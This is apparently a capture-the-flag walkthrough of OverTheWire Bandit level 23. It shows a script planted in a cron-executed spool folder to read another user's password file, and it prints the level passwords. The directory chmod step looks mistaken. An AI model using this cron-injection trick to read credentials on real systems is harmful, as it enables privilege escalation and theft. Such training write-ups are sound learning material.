---
title: "Bandit: Level 23 - Level 24"
date: 2024-09-12 14:00:00 -500 
categories: [OvertheWire, Bandit]
tags: [linux,wargames,bandit,overthewire]
author: Christoph K
---
<!-- Change LEVELS -->

### Level 23

**Username:** `bandit23`  
**Password:** `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

### Task:
https://overthewire.org/wargames/bandit/bandit24.html

<!-- PICTURE FROM TASK -->
    A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

    NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

    NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
<!-- change username bandit!! -->

### Start

Let's begin by connecting to the server `bandit.labs.overthewire.org` and logging in with user `bandit23` on port `2220`.



<!-- CHANGE COMMANDS IF NECCESSARY -->


### Solve the level

We have to write our first shell bash script, so lets see what we have to do. First we have to check what the `cron` job does.

```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
Okay lets see the bash script.

```bash

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```

What does this script do:

- Finds your username: It stores the result of the whoami command (which shows your username) in the variable myname.

- Changes directory: It goes into the folder /var/spool/[your username]/foo, where [your username] is replaced by the result of whoami.

- Displays a message: It prints a message saying it's about to run and delete all scripts in the folder /var/spool/[your username]/foo.

- Loops through files: It goes through all files (even hidden ones) in this folder.

- Ignores special files: It skips the special entries . (current directory) and .. (parent directory).

- Handles each file: For each remaining file:

    - It prints a message showing which file is being handled.
    - It checks the owner of the file using the stat command.
    - If the owner is "bandit23", it runs the script with a timeout of 60 seconds. If the script takes longer, it will be forcefully stopped.
    - After executing the script (if applicable), it deletes the file.


#### What can we do? 

The cronjob executes this script, which executes all scripts in a specific folder with different permissions. So we could create a script there which will be executed and gives us the password.

- All passwords are saved in `etc/bandit_pass/banditLVL`
- We need to get the output from that password where we have read permissions


I go through it Step by Step:

-  Create a directory where we can "work" 
-  Create with nano our script

```bash
bandit23@bandit:/etc/bandit_pass$ cd /tmp/tmp.cxPDYrL7Vd
bandit23@bandit:/tmp/tmp.cxPDYrL7Vd$ nano script.sh
```
-  Write a script which creates the ouput of the password from `bandit24` into our directory

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24>/tmp/tmp.cxPDYrL7Vd/password.txt
```

- Change permissions on the file and folder!

```bash
bandit23@bandit:/tmp/tmp.cxPDYrL7Vd$ chmod +x script.sh
chmod 644 /tmp/tmp.cxPDYrL7Vd
```
-  Copy the script to the prefered location 

```bash
bandit23@bandit:/tmp/tmp.cxPDYrL7Vd$ cp script.sh /var/spool/bandit24/foo
```

- Wait until `password.txt` is in our directory (1 min max)

```bash
bandit23@bandit:/tmp/tmp.cxPDYrL7Vd$ cat password.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

And we have our password :-)

Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`


### Note:
Dont worry if you couldnt come up with a solution. It takes time to learn all that stuff and after learning to `use` it. I would highly recommend to learn the basics from bash, it is easy to learn and very useful!

